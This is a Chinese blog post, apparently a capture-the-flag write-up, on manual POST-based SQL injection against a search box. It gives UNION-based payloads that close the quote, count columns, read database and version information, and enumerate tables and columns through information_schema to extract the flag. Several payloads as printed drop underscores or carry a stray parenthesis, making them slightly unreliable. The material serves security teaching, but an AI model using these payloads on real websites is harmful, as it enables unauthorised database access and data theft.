---
layout:     post                    # 使用的布局（不需要改）
title:      SQL注入 --手工post          # 标题 
subtitle:   post注入   #副标题
date:       2020-03-13              # 时间
author:        SGQ                   # 作者
header-img: img/post-bg-hacker.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                                    #标签
    - SQL注入  
    
---

## 原理:
> 简单的说就是在post/getweb表单、输入域名或页面请求的查询字符串中插入SQL命令，最终使web服务器执行恶意命令的过程。
假设某网站页面显示时URL为--- http://www.xxx.com?test=123 ---，此时URL实际向服务器传递了值为123的变量test，这表明当前页面是对数据库进行动态查询的结果。由此，我们可以在URL中插入恶意的SQL语句并进行执行。

## 题目:
>
>一个简单的输入搜索框

## 考察点：
>sql注入中的post注入。
>一般有两种方式：
>第一种方式，通过burpsuit抓包存在一个文件中，然后通过sqlmap -r进行读取。
>第二种方式，通过手工注入，构造payload，进行union查询。如果通过手工注入，怎么分析注入点，怎么构造payload，怎么获取表名列名，怎么读取数据呢？

## 解题过程：
>1.首先查看网页源代码，发现是post方法，果断打开hackerbar。post注入是通过对输入框进行传参，可以被带入数据库进行的查询，
post注入的两个条件：1.用户可以控制传参，2.用户输入的语句被带入数据库进行查询。

>2.Post data 框 输入search=' ，发现页面出错，可知存在注入的可能。继续输入search=' and 1=1，发现依然报错，search=' and 1=1# 发现变回正常页面。证明存在注入点，可用'  #进行闭合。
>如何理解所构造的payload？
>
>OK,简单的解释一下SQL语句.我们搜索的内容是--- ' and 1=1 # ---,代入到数据库的语句是:--- select * from XXX where search = ' ' and 1=1 #' ---，搜索框开头输入的单引号闭合了原来前面的单引号，最后是一个#,注释了后面的单引号,数据库在执行语句的时候其实执行的是:--- select * from XXX where content = ' ' and 1=1 ---,这个语句理解就很简单了。

> 3.用order by 查询当前页面连接的列名个数：--- search=' order by 1# ---页面返回正常 ，直到4，页面开始出错，说明有3个。

> 4.使用union 联合查询 显错点，输出点，语句：--- search='  union select 1,2,3#  ---，页面爆出显位2，3。

> 5.OK,接下来的步骤就很容易了，利用hackerbar插件，构造--- search= ' Union Select 1,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),3# ---,得到数据库名为news。

> 6.接着获取表名，构造--- search= ' Union Select 1,group concat(table name),3 from information schema.tables where table schema= 0x6E657773 # ---，得到表名为f1agfl4gher3。

> 注意：这里需要把数据库名称“news”做了一个16进制Hex编码，编码之后为---0x6E657773 ---。

>7.同理获取列名：--- search= ' Union Select 1,group concat(column name),3 from information schema.columns where table name=0x66316167666C346768657233)# --- ，得到列名为h3r31sfl4g。

> 8.最后获取数据，--- search= ' Union Select 1,h3r31sfl4g,3 from f1agfl4gher3 # ---，得到flag！

> --- flag{sql_ information_ schema_ hack} ---





>[参考链接（一）：](https://www.fujieace.com/penetration-test/mysql-manual-injection.html)
>[参考链接（二）：](https://blog.csdn.net/qq_42097777/article/details/89088142)

## 谢谢您的查阅，欢迎来访！
